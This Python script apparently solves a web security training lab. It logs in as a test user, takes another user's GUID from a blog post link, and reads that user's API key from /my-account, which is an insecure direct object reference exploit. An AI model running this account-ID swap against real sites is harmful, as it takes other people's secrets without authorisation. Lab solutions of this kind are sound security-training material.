import sys
import requests
from bs4 import BeautifulSoup

def verify_if_lab_solved(url):

    response = requests.get(url + "/")

    if "you solved the lab!".lower() in response.text:
        print("[+] Solved the lab successfully")
    else:
        print("[!] LAB NOT SOLVED, please check manually once")

def init_soup(response_text):
    return BeautifulSoup(response_text, "html.parser")

def get_carlos_api_key(url):

    print()
    print(f"[*] Sending request as POST {url}/login")
    print()

    data = {
         "username": "wiener",
         "password": "peter",
    }

    s = requests.Session()

    print("[+] Sending GET request to /login to get the csrf token")
    response = s.get(url=url + "/login")
    soup = init_soup(response.text)
    csrf_token = soup.find("input")["value"]
    print(f"CSRF TOKEN: {csrf_token}")

    data["csrf"] = csrf_token

    response = s.post(url=url,data=data)

    print(f"Sending a get request to {url}/post?postId=9")

    response = s.get(url + "/post?postId=9")
    soup = init_soup(response.text)
    carlos_guid = soup.find("a", string="carlos").get("href").split("=")[-1]
    print(f"Carlos GUID: {carlos_guid}")

    print(f"Fetching carlos API key from {url}/my-account?id={carlos_guid}")

    response = s.get(url + f"/my-account?id={carlos_guid}")
    soup = init_soup(response.text)
    api_key = soup.find("div", id="account-content").find("div").get_text().split(":")[-1].strip()
    print(f"Carlos API key: {api_key}")

    print(f"Sending API key to POST {url}/submitSolution")
    response = s.post(url + "/submitSolution", data={
        "answer" : api_key
    })


    print()
    print(f"Request Method: {response.request.method}")
    print(response.text)
    print(f"Request Url: {response.request.url}")
    print(f"Request Headers: {response.request.headers}")
    print()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage: python file.py https://website.net")
    else:
        url = sys.argv[1].strip("/")
        get_carlos_api_key(url)
        verify_if_lab_solved(url)
